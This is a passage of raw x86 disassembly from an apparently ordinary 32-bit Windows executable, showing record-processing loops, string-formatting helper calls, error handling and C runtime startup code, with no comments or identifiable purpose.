  40d796:	call   0x40b52e
  40d79b:	mov    DWORD PTR [ebp-0x1c],eax
  40d79e:	test   eax,eax
  40d7a0:	je     0x40da94
  40d7a6:	and    DWORD PTR [ebp-0x18],0x0
  40d7aa:	xor    eax,eax
  40d7ac:	mov    DWORD PTR [ebp-0x8],eax
  40d7af:	add    esi,0x200
  40d7b5:	and    DWORD PTR [ebp-0x10],0x0
  40d7b9:	and    DWORD PTR [ebp-0xc],0x0
  40d7bd:	test   DWORD PTR [esi+0x4],0x1000
  40d7c4:	jne    0x40d8e3
  40d7ca:	test   DWORD PTR [esi+0x4],0x88000
  40d7d1:	je     0x40d7ed
  40d7d3:	mov    eax,DWORD PTR [esi]
  40d7d5:	mov    ecx,ebx
  40d7d7:	mov    DWORD PTR [ebp-0xc],0x1
  40d7de:	mov    DWORD PTR [ebp-0x10],eax
  40d7e1:	call   0x40aca3
  40d7e6:	shr    eax,1
  40d7e8:	mov    DWORD PTR [esi],eax
  40d7ea:	mov    eax,DWORD PTR [ebp-0x8]
  40d7ed:	push   0x401bb4
  40d7f2:	push   DWORD PTR [ebp-0x1c]
  40d7f5:	lea    ecx,[esi-0x200]
  40d7fb:	mov    edx,eax
  40d7fd:	call   0x40d1a9
  40d802:	mov    eax,DWORD PTR [ebp-0xc]
  40d805:	xor    ecx,ecx
  40d807:	test   eax,eax
  40d809:	jne    0x40d839
  40d80b:	mov    eax,DWORD PTR [esi+0x4]
  40d80e:	test   eax,0x10000
  40d813:	jne    0x40d829
  40d815:	and    eax,0xff0
  40d81a:	cmp    eax,0x20
  40d81d:	je     0x40d829
  40d81f:	cmp    eax,0x30
  40d822:	je     0x40d829
  40d824:	cmp    eax,0x40
  40d827:	jne    0x40d82c
  40d829:	xor    ecx,ecx
  40d82b:	inc    ecx
  40d82c:	mov    edx,DWORD PTR [esi]
  40d82e:	push   ecx
  40d82f:	mov    ecx,ebx
  40d831:	call   0x409f47
  40d836:	mov    eax,DWORD PTR [ebp-0xc]
  40d839:	cmp    eax,0x1
  40d83c:	jne    0x40d843
  40d83e:	mov    eax,DWORD PTR [ebp-0x10]
  40d841:	mov    DWORD PTR [esi],eax
  40d843:	cmp    DWORD PTR [ebp-0x18],0x1
  40d847:	jne    0x40d855
  40d849:	mov    edx,0x40185c
  40d84e:	mov    ecx,edi
  40d850:	call   0x40a377
  40d855:	test   DWORD PTR [esi+0x4],0x8000
  40d85c:	mov    edx,ebx
  40d85e:	mov    ecx,edi
  40d860:	je     0x40d8d4
  40d862:	push   DWORD PTR [esi]
  40d864:	push   0x401bb4
  40d869:	call   0x40d46d
  40d86e:	mov    ecx,ebx
  40d870:	call   0x409e13
  40d875:	test   eax,eax
  40d877:	je     0x40d8d9
  40d879:	mov    ecx,DWORD PTR [ebp-0x4]
  40d87c:	push   0x3
  40d87e:	pop    edx
  40d87f:	call   0x40b36e
  40d884:	mov    DWORD PTR [ebp-0x10],eax
  40d887:	cmp    eax,0xffffffff
  40d88a:	je     0x40d8d9
  40d88c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d88f:	mov    edx,eax
  40d891:	push   0x0
  40d893:	call   0x40aeb4
  40d898:	test   eax,eax
  40d89a:	je     0x40d8b0
  40d89c:	cmp    DWORD PTR [eax+0x4],0x80000
  40d8a3:	jne    0x40d8b0
  40d8a5:	push   DWORD PTR [ebp-0x8]
  40d8a8:	mov    ecx,DWORD PTR [eax+0xc]
  40d8ab:	call   0x40b881
  40d8b0:	mov    edx,DWORD PTR [ebp-0x10]
  40d8b3:	push   ecx
  40d8b4:	mov    ecx,DWORD PTR [ebp-0x4]
  40d8b7:	push   ebx
  40d8b8:	push   0x2
  40d8ba:	call   0x40b94a
  40d8bf:	mov    edx,DWORD PTR [ebp-0x10]
  40d8c2:	push   ecx
  40d8c3:	mov    ecx,DWORD PTR [ebp-0x4]
  40d8c6:	push   0x401bb4
  40d8cb:	push   0x1
  40d8cd:	call   0x40b94a
  40d8d2:	jmp    0x40d8d9
  40d8d4:	call   0x40a377
  40d8d9:	mov    eax,DWORD PTR [ebp-0x8]
  40d8dc:	mov    DWORD PTR [ebp-0x18],0x1
  40d8e3:	inc    eax
  40d8e4:	add    esi,0x294
  40d8ea:	mov    DWORD PTR [ebp-0x8],eax
  40d8ed:	cmp    eax,0x21
  40d8f0:	jb     0x40d7b5
  40d8f6:	mov    edx,0x4018f8
  40d8fb:	mov    ecx,edi
  40d8fd:	call   0x40a377
  40d902:	mov    ecx,DWORD PTR [ebp-0x4]
  40d905:	call   0x40b4f1
  40d90a:	mov    DWORD PTR [ebp-0x8],eax
  40d90d:	test   eax,eax
  40d90f:	je     0x40da94
  40d915:	jmp    0x40d91a
  40d917:	mov    ecx,DWORD PTR [ebp-0x4]
  40d91a:	or     DWORD PTR [ebp-0x18],0xffffffff
  40d91e:	xor    esi,esi
  40d920:	and    DWORD PTR [ebp-0xc],0x0
  40d924:	mov    DWORD PTR [ebp-0x1c],esi
  40d927:	test   eax,eax
  40d929:	je     0x40da7d
  40d92f:	jmp    0x40d934
  40d931:	mov    ecx,DWORD PTR [ebp-0x4]
  40d934:	push   0x0
  40d936:	mov    edx,esi
  40d938:	call   0x40aeb4
  40d93d:	test   eax,eax
  40d93f:	je     0x40d95b
  40d941:	cmp    DWORD PTR [eax+0x4],0x80000
  40d948:	jne    0x40d95b
  40d94a:	mov    ecx,DWORD PTR [eax+0xc]
  40d94d:	xor    edx,edx
  40d94f:	call   0x40b577
  40d954:	mov    edx,eax
  40d956:	mov    DWORD PTR [ebp-0x10],eax
  40d959:	jmp    0x40d960
  40d95b:	xor    edx,edx
  40d95d:	mov    DWORD PTR [ebp-0x10],edx
  40d960:	mov    ecx,DWORD PTR [ebp-0x18]
  40d963:	inc    ecx
  40d964:	cmp    ecx,edx
  40d966:	jae    0x40d9d5
  40d968:	mov    esi,DWORD PTR [ebp+0x8]
  40d96b:	imul   eax,ecx,0x294
  40d971:	add    esi,0x200
  40d977:	add    esi,eax
  40d979:	mov    eax,edx
  40d97b:	sub    eax,ecx
  40d97d:	mov    DWORD PTR [ebp-0x18],eax
  40d980:	test   DWORD PTR [esi+0x4],0x1000
  40d987:	jne    0x40d9c1
  40d989:	cmp    DWORD PTR [ebp-0xc],0x1
  40d98d:	jne    0x40d99b
  40d98f:	mov    edx,0x40185c
  40d994:	mov    ecx,edi
  40d996:	call   0x40a377
  40d99b:	mov    ecx,DWORD PTR [esi]
  40d99d:	mov    edx,0x40185c
  40d9a2:	lea    eax,[ecx+0x1]
  40d9a5:	push   eax
  40d9a6:	push   ecx
  40d9a7:	mov    ecx,ebx
  40d9a9:	call   0x40a0ca
  40d9ae:	mov    edx,ebx
  40d9b0:	mov    ecx,edi
  40d9b2:	call   0x40a377
  40d9b7:	mov    eax,DWORD PTR [ebp-0x18]
  40d9ba:	mov    DWORD PTR [ebp-0xc],0x1
  40d9c1:	add    esi,0x294
  40d9c7:	sub    eax,0x1
  40d9ca:	mov    DWORD PTR [ebp-0x18],eax
  40d9cd:	jne    0x40d980
  40d9cf:	mov    esi,DWORD PTR [ebp-0x1c]
  40d9d2:	mov    edx,DWORD PTR [ebp-0x10]
  40d9d5:	cmp    DWORD PTR [ebp-0xc],0x1
  40d9d9:	mov    DWORD PTR [ebp-0x18],edx
  40d9dc:	jne    0x40d9ea
  40d9de:	mov    edx,0x40185c
  40d9e3:	mov    ecx,edi
  40d9e5:	call   0x40a377
  40d9ea:	mov    ecx,DWORD PTR [ebp-0x4]
  40d9ed:	mov    edx,esi
  40d9ef:	push   0x2
  40d9f1:	call   0x40b7b1
  40d9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d9f9:	mov    edx,esi
  40d9fb:	push   0x1
  40d9fd:	mov    DWORD PTR [ebp-0x1c],eax
  40da00:	call   0x40b7b1
  40da05:	cmp    DWORD PTR [ebp-0x1c],0x0
  40da09:	mov    DWORD PTR [ebp-0x20],eax
  40da0c:	je     0x40da6e
  40da0e:	test   eax,eax
  40da10:	je     0x40da6e
  40da12:	mov    ecx,ebx
  40da14:	call   0x40aca3
  40da19:	mov    edx,DWORD PTR [ebp-0x1c]
  40da1c:	mov    ecx,ebx
  40da1e:	shr    eax,1
  40da20:	push   eax
  40da21:	call   0x40a26c
  40da26:	imul   eax,DWORD PTR [ebp-0x10],0x294
  40da2d:	mov    edx,ebx
  40da2f:	mov    ecx,DWORD PTR [ebp+0x8]
  40da32:	push   DWORD PTR [eax+ecx*1+0x200]
  40da39:	mov    ecx,edi
  40da3b:	push   DWORD PTR [ebp-0x20]
  40da3e:	call   0x40d46d
  40da43:	mov    ecx,ebx
  40da45:	call   0x409e13
  40da4a:	mov    edx,esi
  40da4c:	test   eax,eax
  40da4e:	jne    0x40da62
  40da50:	mov    ecx,DWORD PTR [ebp-0x4]
  40da53:	call   0x40b49a
  40da58:	mov    eax,DWORD PTR [ebp-0x8]
  40da5b:	dec    esi
  40da5c:	dec    eax
  40da5d:	mov    DWORD PTR [ebp-0x8],eax
  40da60:	jmp    0x40da71
  40da62:	push   ecx
  40da63:	mov    ecx,DWORD PTR [ebp-0x4]
  40da66:	push   ebx
  40da67:	push   0x2
  40da69:	call   0x40b94a
  40da6e:	mov    eax,DWORD PTR [ebp-0x8]
  40da71:	inc    esi
  40da72:	mov    DWORD PTR [ebp-0x1c],esi
  40da75:	cmp    esi,eax
  40da77:	jb     0x40d931
  40da7d:	mov    edx,0x4018f8
  40da82:	mov    ecx,edi
  40da84:	call   0x40a377
  40da89:	mov    eax,DWORD PTR [ebp-0x8]
  40da8c:	test   eax,eax
  40da8e:	jne    0x40d917
  40da94:	mov    eax,DWORD PTR [ebp-0x14]
  40da97:	mov    esi,DWORD PTR [ebp+0x8]
  40da9a:	inc    eax
  40da9b:	mov    DWORD PTR [ebp-0x14],eax
  40da9e:	cmp    eax,DWORD PTR [ebp-0x24]
  40daa1:	jb     0x40d77a
  40daa7:	lea    ecx,[ebp-0x4]
  40daaa:	call   0x40b196
  40daaf:	jmp    0x40dad6
  40dab1:	call   DWORD PTR ds:0x4120cc
  40dab7:	test   eax,eax
  40dab9:	jne    0x40dad1
  40dabb:	push   0x8
  40dabd:	jmp    0x40dacb
  40dabf:	call   DWORD PTR ds:0x4120cc
  40dac5:	test   eax,eax
  40dac7:	jne    0x40dad1
  40dac9:	push   0x57
  40dacb:	call   DWORD PTR ds:0x412014
  40dad1:	call   0x4095c0
  40dad6:	pop    edi
  40dad7:	pop    esi
  40dad8:	pop    ebx
  40dad9:	mov    esp,ebp
  40dadb:	pop    ebp
  40dadc:	ret    0xc
  40dadf:	int3   
  40dae0:	int3   
  40dae1:	int3   
  40dae2:	int3   
  40dae3:	int3   
  40dae4:	mov    edi,edi
  40dae6:	push   ebp
  40dae7:	mov    ebp,esp
  40dae9:	sub    esp,0xc0
  40daef:	mov    eax,ds:0x411004
  40daf4:	xor    eax,ebp
  40daf6:	mov    DWORD PTR [ebp-0x8],eax
  40daf9:	mov    eax,DWORD PTR [ebp+0x10]
  40dafc:	and    DWORD PTR [ebp-0x8c],0x0
  40db03:	push   ebx
  40db04:	mov    ebx,DWORD PTR [ebp+0x8]
  40db07:	push   esi
  40db08:	push   edi
  40db09:	push   0x7c
  40db0b:	mov    DWORD PTR [ebp-0xa4],eax
  40db11:	mov    esi,ecx
  40db13:	lea    eax,[ebp-0x88]
  40db19:	mov    DWORD PTR [ebp-0x94],esi
  40db1f:	push   0x0
  40db21:	push   eax
  40db22:	mov    DWORD PTR [ebp-0xb0],ebx
  40db28:	call   0x40eb54
  40db2d:	add    esp,0xc
  40db30:	test   esi,esi
  40db32:	je     0x40dd88
  40db38:	test   ebx,ebx
  40db3a:	je     0x40dd88
  40db40:	push   0x1
  40db42:	push   0x1000
  40db47:	push   0x16
  40db49:	xor    edx,edx
  40db4b:	pop    ecx
  40db4c:	call   0x409339
  40db51:	mov    DWORD PTR [ebp-0x90],eax
  40db57:	test   eax,eax
  40db59:	jne    0x40db70
  40db5b:	call   DWORD PTR ds:0x4120cc
  40db61:	test   eax,eax
  40db63:	jne    0x40dd9a
  40db69:	push   0x8
  40db6b:	jmp    0x40dd94
  40db70:	push   0x21
  40db72:	mov    edi,ebx
  40db74:	xor    esi,esi
  40db76:	pop    ebx
  40db77:	mov    ecx,edi
  40db79:	call   0x409e13
  40db7e:	cmp    esi,eax
  40db80:	jae    0x40db84
  40db82:	mov    esi,eax
  40db84:	add    edi,0x294
  40db8a:	sub    ebx,0x1
  40db8d:	jne    0x40db77
  40db8f:	mov    ecx,DWORD PTR [ebp-0xa4]
  40db95:	mov    DWORD PTR [ebp-0xa0],esi
  40db9b:	call   0x40b4f1
  40dba0:	mov    esi,DWORD PTR [ebp-0x94]
  40dba6:	mov    DWORD PTR [ebp-0x9c],eax
  40dbac:	mov    DWORD PTR [ebp-0xac],ebx
  40dbb2:	test   eax,eax
  40dbb4:	je     0x40dd9f
  40dbba:	mov    edx,ebx
  40dbbc:	call   0x40b52e
  40dbc1:	mov    DWORD PTR [ebp-0xbc],eax
  40dbc7:	test   eax,eax
  40dbc9:	je     0x40dd6d
  40dbcf:	mov    ebx,DWORD PTR [ebp-0xb0]
  40dbd5:	and    DWORD PTR [ebp-0x98],0x0
  40dbdc:	add    ebx,0x200
  40dbe2:	mov    edi,DWORD PTR [ebp-0x90]
  40dbe8:	mov    DWORD PTR [ebp-0xa8],ebx
  40dbee:	mov    ecx,edi
  40dbf0:	call   0x40aca3
  40dbf5:	shr    eax,1
  40dbf7:	mov    edx,0x401350
  40dbfc:	push   eax
  40dbfd:	mov    ecx,edi
  40dbff:	call   0x40a26c
  40dc04:	test   DWORD PTR [ebx+0x4],0x1000
  40dc0b:	jne    0x40dd2e
  40dc11:	mov    ecx,DWORD PTR [ebp-0x90]
  40dc17:	lea    edi,[ebx-0x200]
  40dc1d:	push   edi
  40dc1e:	push   0x401bbc
  40dc23:	call   0x40aca3
  40dc28:	shr    eax,1
  40dc2a:	dec    eax
  40dc2b:	push   eax
  40dc2c:	push   DWORD PTR [ebp-0x90]
  40dc32:	call   0x40adea
  40dc37:	mov    eax,DWORD PTR [ebp-0xa0]
  40dc3d:	add    esp,0x10
  40dc40:	mov    ecx,DWORD PTR [ebp-0x90]
  40dc46:	add    eax,0x2
  40dc49:	mov    edx,eax
  40dc4b:	mov    DWORD PTR [ebp-0xb4],eax
  40dc51:	push   0x0
  40dc53:	call   0x409f47
  40dc58:	mov    edx,DWORD PTR [ebp-0x90]
  40dc5e:	mov    ecx,esi
  40dc60:	call   0x40a377
  40dc65:	mov    ecx,DWORD PTR [ebp-0x90]
  40dc6b:	mov    esi,DWORD PTR [ebx]
  40dc6d:	call   0x40aca3
  40dc72:	mov    edx,DWORD PTR [ebp-0x98]
  40dc78:	mov    ecx,edi
  40dc7a:	push   0x4018f8
  40dc7f:	push   DWORD PTR [ebp-0xbc]
  40dc85:	shr    eax,1
  40dc87:	mov    DWORD PTR [ebx],eax
  40dc89:	call   0x40d1a9
  40dc8e:	mov    edi,DWORD PTR [ebp-0x90]
  40dc94:	push   0x4018f8
  40dc99:	push   edi
  40dc9a:	mov    DWORD PTR [ebx],esi
  40dc9c:	call   DWORD PTR ds:0x412270
  40dca2:	mov    esi,DWORD PTR [ebp-0x94]
  40dca8:	mov    DWORD PTR [ebp-0xb8],eax
  40dcae:	pop    ecx
  40dcaf:	pop    ecx
  40dcb0:	test   eax,eax
  40dcb2:	je     0x40dd22
  40dcb4:	mov    ebx,eax
  40dcb6:	mov    edx,ebx
  40dcb8:	mov    ecx,esi
  40dcba:	call   0x40a377
  40dcbf:	push   0x4018f8
  40dcc4:	push   0x0
  40dcc6:	call   DWORD PTR ds:0x412270
  40dccc:	mov    ebx,eax
  40dcce:	pop    ecx
  40dccf:	pop    ecx
  40dcd0:	test   ebx,ebx
  40dcd2:	je     0x40dd1c
  40dcd4:	mov    ecx,edi
  40dcd6:	call   0x40aca3
  40dcdb:	shr    eax,1
  40dcdd:	lea    ecx,[ebp-0x8c]
  40dce3:	push   eax
  40dce4:	mov    edx,0x40185c
  40dce9:	call   0x40a26c
  40dcee:	mov    edx,DWORD PTR [ebp-0xb4]
  40dcf4:	lea    ecx,[ebp-0x8c]
  40dcfa:	push   0x0
  40dcfc:	call   0x409f47
  40dd01:	mov    edx,0x4018f8
  40dd06:	mov    ecx,esi
  40dd08:	call   0x40a377
  40dd0d:	lea    edx,[ebp-0x8c]
  40dd13:	mov    ecx,esi
  40dd15:	call   0x40a377
  40dd1a:	jmp    0x40dcb6
  40dd1c:	mov    ebx,DWORD PTR [ebp-0xa8]
  40dd22:	mov    edx,0x4018f8
  40dd27:	mov    ecx,esi
  40dd29:	call   0x40a377
  40dd2e:	mov    eax,DWORD PTR [ebp-0x98]
  40dd34:	add    ebx,0x294
  40dd3a:	inc    eax
  40dd3b:	mov    DWORD PTR [ebp-0xa8],ebx
  40dd41:	mov    DWORD PTR [ebp-0x98],eax
  40dd47:	cmp    eax,0x21
  40dd4a:	jb     0x40dbee
  40dd50:	mov    ebx,DWORD PTR [ebp-0xac]
  40dd56:	lea    eax,[ebx+0x1]
  40dd59:	cmp    eax,DWORD PTR [ebp-0x9c]
  40dd5f:	jae    0x40dd6d
  40dd61:	mov    edx,0x4018f8
  40dd66:	mov    ecx,esi
  40dd68:	call   0x40a377
  40dd6d:	mov    ecx,DWORD PTR [ebp-0xa4]
  40dd73:	inc    ebx
  40dd74:	mov    DWORD PTR [ebp-0xac],ebx
  40dd7a:	cmp    ebx,DWORD PTR [ebp-0x9c]
  40dd80:	jb     0x40dbba
  40dd86:	jmp    0x40dd9f
  40dd88:	call   DWORD PTR ds:0x4120cc
  40dd8e:	test   eax,eax
  40dd90:	jne    0x40dd9a
  40dd92:	push   0x57
  40dd94:	call   DWORD PTR ds:0x412014
  40dd9a:	call   0x4095c0
  40dd9f:	mov    ecx,DWORD PTR [ebp-0x8]
  40dda2:	pop    edi
  40dda3:	pop    esi
  40dda4:	xor    ecx,ebp
  40dda6:	pop    ebx
  40dda7:	call   0x40e2c0
  40ddac:	mov    esp,ebp
  40ddae:	pop    ebp
  40ddaf:	ret    0xc
  40ddb2:	int3   
  40ddb3:	int3   
  40ddb4:	int3   
  40ddb5:	int3   
  40ddb6:	int3   
  40ddb7:	mov    edi,edi
  40ddb9:	push   ebp
  40ddba:	mov    ebp,esp
  40ddbc:	sub    esp,0x18
  40ddbf:	push   ebx
  40ddc0:	push   esi
  40ddc1:	push   edi
  40ddc2:	mov    edi,ecx
  40ddc4:	test   edi,edi
  40ddc6:	je     0x40df76
  40ddcc:	mov    esi,DWORD PTR [ebp+0x8]
  40ddcf:	test   esi,esi
  40ddd1:	je     0x40df76
  40ddd7:	push   0x1
  40ddd9:	push   0x1000
  40ddde:	push   0x16
  40dde0:	xor    edx,edx
  40dde2:	pop    ecx
  40dde3:	call   0x409339
  40dde8:	mov    ebx,eax
  40ddea:	test   ebx,ebx
  40ddec:	jne    0x40de03
  40ddee:	call   DWORD PTR ds:0x4120cc
  40ddf4:	test   eax,eax
  40ddf6:	jne    0x40df88
  40ddfc:	push   0x8
  40ddfe:	jmp    0x40df82
  40de03:	test   DWORD PTR [ebp+0xc],0x1000
  40de0a:	jne    0x40de77
  40de0c:	push   0x21
  40de0e:	pop    eax
  40de0f:	xor    ecx,ecx
  40de11:	mov    DWORD PTR [ebp-0x8],eax
  40de14:	test   DWORD PTR [esi+0x204],0x1000
  40de1e:	jne    0x40de5a
  40de20:	cmp    ecx,0x1
  40de23:	jne    0x40de31
  40de25:	mov    edx,0x401bc4
  40de2a:	mov    ecx,edi
  40de2c:	call   0x40a377
  40de31:	push   esi
  40de32:	push   0x401bc8
  40de37:	mov    ecx,ebx
  40de39:	call   0x40aca3
  40de3e:	shr    eax,1
  40de40:	dec    eax
  40de41:	push   eax
  40de42:	push   ebx
  40de43:	call   0x40adea
  40de48:	add    esp,0x10
  40de4b:	mov    edx,ebx
  40de4d:	mov    ecx,edi
  40de4f:	call   0x40a377
  40de54:	mov    eax,DWORD PTR [ebp-0x8]
  40de57:	xor    ecx,ecx
  40de59:	inc    ecx
  40de5a:	add    esi,0x294
  40de60:	sub    eax,0x1
  40de63:	mov    DWORD PTR [ebp-0x8],eax
  40de66:	jne    0x40de14
  40de68:	mov    edx,0x4018f8
  40de6d:	mov    ecx,edi
  40de6f:	call   0x40a377
  40de74:	mov    esi,DWORD PTR [ebp+0x8]
  40de77:	mov    ecx,DWORD PTR [ebp+0x10]
  40de7a:	call   0x40b4f1
  40de7f:	mov    ecx,eax
  40de81:	xor    eax,eax
  40de83:	mov    DWORD PTR [ebp-0x18],ecx
  40de86:	mov    DWORD PTR [ebp-0x10],eax
  40de89:	test   ecx,ecx
  40de8b:	je     0x40df8d
  40de91:	mov    ecx,DWORD PTR [ebp+0x10]
  40de94:	mov    edx,eax
  40de96:	call   0x40b52e
  40de9b:	mov    DWORD PTR [ebp-0x14],eax
  40de9e:	test   eax,eax
  40dea0:	je     0x40df61
  40dea6:	and    DWORD PTR [ebp-0xc],0x0
  40deaa:	and    DWORD PTR [ebp-0x8],0x0
  40deae:	add    esi,0x200
  40deb4:	mov    DWORD PTR [ebp-0x4],esi
  40deb7:	mov    ecx,ebx
  40deb9:	call   0x40aca3
  40debe:	shr    eax,1
  40dec0:	mov    edx,0x401350
  40dec5:	push   eax
  40dec6:	mov    ecx,ebx
  40dec8:	call   0x40a26c
  40decd:	test   DWORD PTR [esi+0x4],0x1000
  40ded4:	jne    0x40df3c
  40ded6:	mov    esi,DWORD PTR [esi]
  40ded8:	mov    ecx,ebx
  40deda:	call   0x40aca3
  40dedf:	mov    ecx,DWORD PTR [ebp-0x4]
  40dee2:	mov    edx,DWORD PTR [ebp-0x8]
  40dee5:	shr    eax,1
  40dee7:	push   0x401bc4
  40deec:	push   DWORD PTR [ebp-0x14]
  40deef:	mov    DWORD PTR [ecx],eax
  40def1:	add    ecx,0xfffffe00
  40def7:	call   0x40d1a9
  40defc:	mov    eax,DWORD PTR [ebp-0x4]
  40deff:	mov    DWORD PTR [eax],esi
  40df01:	xor    esi,esi
  40df03:	inc    esi
  40df04:	cmp    DWORD PTR [ebp-0xc],esi
  40df07:	jne    0x40df15
  40df09:	mov    edx,0x401bc4
  40df0e:	mov    ecx,edi
  40df10:	call   0x40a377
  40df15:	mov    edx,0x401bd4
  40df1a:	mov    ecx,edi
  40df1c:	call   0x40a377
  40df21:	mov    edx,ebx
  40df23:	mov    ecx,edi
  40df25:	call   0x40a377
  40df2a:	mov    edx,0x401bd4
  40df2f:	mov    ecx,edi
  40df31:	call   0x40a377
  40df36:	mov    DWORD PTR [ebp-0xc],esi
  40df39:	mov    esi,DWORD PTR [ebp-0x4]
  40df3c:	mov    eax,DWORD PTR [ebp-0x8]
  40df3f:	add    esi,0x294
  40df45:	inc    eax
  40df46:	mov    DWORD PTR [ebp-0x4],esi
  40df49:	mov    DWORD PTR [ebp-0x8],eax
  40df4c:	cmp    eax,0x21
  40df4f:	jb     0x40deb7
  40df55:	mov    edx,0x4018f8
  40df5a:	mov    ecx,edi
  40df5c:	call   0x40a377
  40df61:	mov    eax,DWORD PTR [ebp-0x10]
  40df64:	mov    esi,DWORD PTR [ebp+0x8]
  40df67:	inc    eax
  40df68:	mov    DWORD PTR [ebp-0x10],eax
  40df6b:	cmp    eax,DWORD PTR [ebp-0x18]
  40df6e:	jb     0x40de91
  40df74:	jmp    0x40df8d
  40df76:	call   DWORD PTR ds:0x4120cc
  40df7c:	test   eax,eax
  40df7e:	jne    0x40df88
  40df80:	push   0x57
  40df82:	call   DWORD PTR ds:0x412014
  40df88:	call   0x4095c0
  40df8d:	pop    edi
  40df8e:	pop    esi
  40df8f:	pop    ebx
  40df90:	mov    esp,ebp
  40df92:	pop    ebp
  40df93:	ret    0xc
  40df96:	int3   
  40df97:	int3   
  40df98:	int3   
  40df99:	int3   
  40df9a:	int3   
  40df9b:	jmp    0x40e3f6
  40dfa0:	int3   
  40dfa1:	int3   
  40dfa2:	int3   
  40dfa3:	int3   
  40dfa4:	int3   
  40dfa5:	mov    edi,edi
  40dfa7:	push   ebp
  40dfa8:	mov    ebp,esp
  40dfaa:	push   esi
  40dfab:	jmp    0x40dfba
  40dfad:	push   DWORD PTR [ebp+0x8]
  40dfb0:	call   0x40e40e
  40dfb5:	pop    ecx
  40dfb6:	test   eax,eax
  40dfb8:	je     0x40dfc9
  40dfba:	push   DWORD PTR [ebp+0x8]
  40dfbd:	call   0x40e402
  40dfc2:	mov    esi,eax
  40dfc4:	pop    ecx
  40dfc5:	test   esi,esi
  40dfc7:	je     0x40dfad
  40dfc9:	mov    eax,esi
  40dfcb:	pop    esi
  40dfcc:	pop    ebp
  40dfcd:	ret    
  40dfce:	int3   
  40dfcf:	int3   
  40dfd0:	int3   
  40dfd1:	int3   
  40dfd2:	int3   
  40dfd3:	int3   
  40dfd4:	int3   
  40dfd5:	int3   
  40dfd6:	int3   
  40dfd7:	int3   
  40dfd8:	int3   
  40dfd9:	int3   
  40dfda:	int3   
  40dfdb:	int3   
  40dfdc:	int3   
  40dfdd:	int3   
  40dfde:	int3   
  40dfdf:	int3   
  40dfe0:	mov    eax,0x5a4d
  40dfe5:	cmp    WORD PTR ds:0x400000,ax
  40dfec:	je     0x40dff2
  40dfee:	xor    eax,eax
  40dff0:	jmp    0x40e040
  40dff2:	mov    ecx,DWORD PTR ds:0x40003c
  40dff8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  40e002:	jne    0x40dfee
  40e004:	movzx  eax,WORD PTR [ecx+0x400018]
  40e00b:	cmp    eax,0x10b
  40e010:	je     0x40e02c
  40e012:	cmp    eax,0x20b
  40e017:	jne    0x40dfee
  40e019:	xor    eax,eax
  40e01b:	cmp    DWORD PTR [ecx+0x400084],0xe
  40e022:	jbe    0x40e040
  40e024:	cmp    DWORD PTR [ecx+0x4000f8],eax
  40e02a:	jmp    0x40e03d
  40e02c:	xor    eax,eax
  40e02e:	cmp    DWORD PTR [ecx+0x400074],0xe
  40e035:	jbe    0x40e040
  40e037:	cmp    DWORD PTR [ecx+0x4000e8],eax
  40e03d:	setne  al
  40e040:	push   0x1
  40e042:	mov    ds:0x411068,eax
  40e047:	call   0x40e63e
  40e04c:	push   eax
  40e04d:	call   DWORD PTR ds:0x412218
  40e053:	or     DWORD PTR ds:0x4114b4,0xffffffff
  40e05a:	or     DWORD PTR ds:0x4114b8,0xffffffff
  40e061:	pop    ecx
  40e062:	pop    ecx
  40e063:	call   DWORD PTR ds:0x412208
  40e069:	mov    ecx,DWORD PTR ds:0x411398
  40e06f:	mov    DWORD PTR [eax],ecx
  40e071:	call   DWORD PTR ds:0x412224
  40e077:	mov    ecx,DWORD PTR ds:0x41138c
  40e07d:	mov    DWORD PTR [eax],ecx
  40e07f:	call   0x40e890
  40e084:	cmp    DWORD PTR ds:0x411000,0x0
  40e08b:	jne    0x40e099
  40e08d:	push   0x40e890
  40e092:	call   DWORD PTR ds:0x412204
  40e098:	pop    ecx
  40e099:	call   0x40e898
  40e09e:	xor    eax,eax
  40e0a0:	ret    
  40e0a1:	int3   
  40e0a2:	int3   
  40e0a3:	int3   
  40e0a4:	int3   
  40e0a5:	int3   
  40e0a6:	int3   
  40e0a7:	int3   
  40e0a8:	int3   
  40e0a9:	int3   
  40e0aa:	int3   
  40e0ab:	int3   
  40e0ac:	int3   
  40e0ad:	int3   
  40e0ae:	int3   
  40e0af:	int3   
  40e0b0:	mov    eax,ds:0x411394
  40e0b5:	push   0x41106c
  40e0ba:	push   DWORD PTR ds:0x411390
  40e0c0:	mov    ds:0x41106c,eax
  40e0c5:	push   0x411060
  40e0ca:	push   0x41105c
  40e0cf:	push   0x411058
  40e0d4:	call   DWORD PTR ds:0x41221c
  40e0da:	add    esp,0x14
  40e0dd:	mov    ds:0x411064,eax
  40e0e2:	ret    
  40e0e3:	int3   
  40e0e4:	int3   
  40e0e5:	int3   
  40e0e6:	int3   
  40e0e7:	int3   
  40e0e8:	push   0x10
  40e0ea:	push   0x410d38
  40e0ef:	call   0x40e8bc
  40e0f4:	xor    ebx,ebx
  40e0f6:	mov    DWORD PTR [ebp-0x4],ebx
  40e0f9:	mov    eax,fs:0x18
  40e0ff:	mov    esi,DWORD PTR [eax+0x4]
  40e102:	mov    edi,ebx
  40e104:	mov    edx,0x4114bc
  40e109:	mov    ecx,esi
  40e10b:	xor    eax,eax
  40e10d:	lock cmpxchg DWORD PTR [edx],ecx
  40e111:	test   eax,eax
  40e113:	je     0x40e12d
  40e115:	cmp    eax,esi
  40e117:	jne    0x40e120
  40e119:	xor    esi,esi
  40e11b:	inc    esi
  40e11c:	mov    edi,esi
  40e11e:	jmp    0x40e130
  40e120:	push   0x3e8
  40e125:	call   DWORD PTR ds:0x4120bc
  40e12b:	jmp    0x40e104
  40e12d:	xor    esi,esi
  40e12f:	inc    esi
  40e130:	cmp    DWORD PTR ds:0x4114c0,esi
  40e136:	jne    0x40e142
  40e138:	push   0x1f
  40e13a:	call   0x40e67a
  40e13f:	pop    ecx
  40e140:	jmp    0x40e17c
  40e142:	cmp    DWORD PTR ds:0x4114c0,ebx
  40e148:	jne    0x40e176
  40e14a:	mov    DWORD PTR ds:0x4114c0,esi
  40e150:	push   0x401018
  40e155:	push   0x40100c
  40e15a:	call   0x40e25c
  40e15f:	pop    ecx
  40e160:	pop    ecx
  40e161:	test   eax,eax
  40e163:	je     0x40e17c
  40e165:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40e16c:	mov    eax,0xff
  40e171:	jmp    0x40e251
  40e176:	mov    DWORD PTR ds:0x411054,esi
  40e17c:	cmp    DWORD PTR ds:0x4114c0,esi
  40e182:	jne    0x40e19f
  40e184:	push   0x401008
